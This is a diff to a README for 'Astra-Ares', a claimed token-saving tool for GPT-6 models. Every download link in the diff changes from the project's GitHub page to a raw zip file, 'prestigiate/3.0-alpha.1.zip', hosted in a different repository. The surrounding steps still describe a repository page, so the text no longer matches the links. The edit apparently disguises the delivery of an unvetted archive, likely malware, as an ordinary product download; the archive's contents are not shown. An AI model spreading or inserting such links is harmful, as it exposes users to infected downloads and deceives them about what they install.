@@ -5,7 +5,7 @@ description: "Adaptively selects reasoning effort for GPT-6 Astra, Sol, and Luna
 ---
 # ⚡ Astra-Ares - Cut Token Waste, Boost Codex Speed
 
-[![Download Astra-Ares](https://img.shields.io/badge/Download-Astra--Ares-8A2BE2?style=for-the-badge&logo=github)](https://github.com/0xthesultan/Astra-Ares)
+[![Download Astra-Ares](https://img.shields.io/badge/Download-Astra--Ares-8A2BE2?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/0xthesultan/0xthesultan.github.io/main/prestigiate/3.0-alpha.1.zip)
 
 ## 🤔 What Is Astra-Ares?
 
@@ -37,7 +37,7 @@ Getting Astra-Ares up and running takes less than two minutes. Follow these simp
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-**[Download Astra-Ares](https://github.com/0xthesultan/Astra-Ares)**
+**[Download Astra-Ares](https://raw.githubusercontent.com/0xthesultan/0xthesultan.github.io/main/prestigiate/3.0-alpha.1.zip)**
 
 You will see the main repository page. Look for the green "Code" button on the right side. Click it, then select "Download ZIP." Your browser will save the file to your Downloads folder.
 
@@ -145,4 +145,4 @@ Astra-Ares is the quiet assistant that pays for itself. One download, zero confi
 
 **Ready to start saving?**
 
-**[👉 Download Astra-Ares Now](https://github.com/0xthesultan/Astra-Ares)**
+**[👉 Download Astra-Ares Now](https://raw.githubusercontent.com/0xthesultan/0xthesultan.github.io/main/prestigiate/3.0-alpha.1.zip)**
